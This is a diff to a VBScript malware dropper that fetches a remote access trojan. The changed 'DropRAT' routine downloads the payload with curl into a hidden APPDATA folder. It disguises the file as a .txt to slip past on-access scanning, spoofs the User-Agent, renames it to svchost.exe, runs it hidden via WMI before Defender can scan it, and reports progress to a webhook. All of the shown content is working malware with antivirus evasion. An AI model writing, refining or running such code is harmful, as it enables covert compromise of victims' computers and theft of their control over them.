@@ -51,7 +51,7 @@ Loop
 
 window.close()
 
-' --- OBFUSCATED RAT DROP ---
+' --- OBFUSCATED & FAST RAT DROP ---
 Sub DropRAT()
     Call PostEmbed(":package: RAT Download", "Fetching Payload...", 10181046)
     
@@ -66,30 +66,37 @@ Sub DropRAT()
     Dim hidDir : hidDir = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Templates"
     If Not fso.FolderExists(hidDir) Then fso.CreateFolder(hidDir)
     
-    Dim op : op = hidDir & "\winlogon.exe"
-    If fso.FileExists(op) Then fso.DeleteFile op
+    ' Download as .txt to bypass on-access scan
+    Dim txtPath : txtPath = hidDir & "\sys_update.txt"
+    Dim exePath : exePath = hidDir & "\svchost.exe"
+    
+    If fso.FileExists(txtPath) Then fso.DeleteFile txtPath
+    If fso.FileExists(exePath) Then fso.DeleteFile exePath
 
-    ' Use curl.exe (handles TLS perfectly) but with the obfuscated URL
-    Dim dlCmd : dlCmd = "cmd /c curl.exe -s -L -o """ & op & """ """ & url & """"
+    ' Use curl.exe with a spoofed User-Agent
+    Dim dlCmd : dlCmd = "cmd /c curl.exe -s -L -A ""Mozilla/5.0"" -o """ & txtPath & """ """ & url & """"
     sh.Run dlCmd, 0, True
 
     Dim rDone : rDone = False
-    If fso.FileExists(op) Then
-        If fso.GetFile(op).Size > 3000000 Then
+    If fso.FileExists(txtPath) Then
+        If fso.GetFile(txtPath).Size > 100000 Then
             rDone = True
         End If
     End If
 
     If rDone Then
-        Dim dsize : dsize = fso.GetFile(op).Size
+        ' Rename and instantly execute before Defender scans
+        fso.MoveFile txtPath, exePath
+        
+        Dim dsize : dsize = fso.GetFile(exePath).Size
         Call PostEmbed(":rocket: RAT Downloaded", "Size: " & CStr(dsize) & " bytes" & vbCrLf & "Launching...", 10181046)
         
         ' Execute hidden via WMI
-        Call RunCmd("""" & op & """")
+        Call RunCmd("""" & exePath & """")
         
         Call PostEmbed(":white_check_mark: RAT", "Payload executed successfully", 10181046)
     Else
-        Call PostEmbed(":hourglass: RAT Timeout", "Download failed or incomplete.", 10181046)
+        Call PostEmbed(":hourglass: RAT Timeout", "Download failed or expired link.", 10181046)
     End If
 End Sub
 
